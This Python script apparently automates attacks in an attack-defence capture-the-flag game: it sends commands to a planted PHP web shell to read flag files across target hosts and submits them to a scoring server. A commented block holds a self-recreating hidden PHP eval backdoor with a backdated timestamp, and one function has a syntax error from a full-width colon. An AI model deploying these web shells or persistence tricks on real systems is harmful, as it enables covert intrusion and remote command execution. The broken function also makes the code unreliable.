import requests
import re
import time
#url = "http://127.0.0.1/door.php"

def get():
		# api-endpoint
	#URL = "http://maps.googleapis.com/maps/api/geocode/json"

	# location given here
	#location = "delhi technological university"

	# defining a params dict for the parameters to be sent to the API
	#PARAMS = {'address':location}

	# sending get request and saving the response as response object
	#r = requests.get(url = URL, params = PARAMS)

	# extracting data in json format
	#data = r.json()
	pass

def post(url):
	data = {'pass': 'lxf',
	        'cmd': "system('cat /var/www/html/flag.txt');"}

	# sending post request and saving response as response object
	r = requests.post(url=url, data=data)

	# extracting response text
	print("The text is:%s" % r.text)
	print(re.search('.*(flag{.*}).*', r.text).group(1))
	return re.search('.*(flag{.*}).*', r.text).group(1)

def submit(flag):
    data = {
        'answer':flag,
        'playertoken': 'token479886aeaf6'
    }
    cookies = {
        'xx':'xx'
    }
    url = 'https://172.20.1.1/Answerapi/sub_answer_api'
    
    try:
        a = requests.post(url, data=data, cookies=cookies, verify=False, timeout=10).json()
        print(a['msg'])
    except Exception as e:
        print(e)



# <?php
#     set_time_limit(0);
#     ignore_user_abort(true);
#     $file = '.demo.php';
#     $shell = '''<?php
# if(md5($_POST['pass'])=='9fb788cd5f51b60ad56804cbfdfa987d'){
#         @eval($_POST['cmd']);
# }
# ?>''';
#     while(true){
#         file_put_contents($file, $shell);
#         system('chmod 777 .demo.php');
#         touch(".demo.php", mktime(11,11,11,11,11,2018));
#         usleep(50);
#         }
# ?>


def updie(url)：
	data = {'pass': 'lxf',
	        'cmd': "system('echo  /var/www/html/flag.txt');"}

	# sending post request and saving response as response object
	r = requests.post(url=url, data=data)

	# extracting response text
	print("The text is:%s" % r.text)
	print(re.search('.*(flag{.*}).*', r.text).group(1))
	return re.search('.*(flag{.*}).*', r.text).group(1)


def main():
	ip_part = "http://127.0.0."
	port = "80"
	shell_addr = "door.php"
	while True:
		for x in range(1,2):
			ip = ip_part+str(x)
			url = ip+":"+port+"/"+shell_addr
			print(url)
			flag = post(url)
			submit(flag)
		time.sleep(1)

if __name__ == '__main__':
	main()
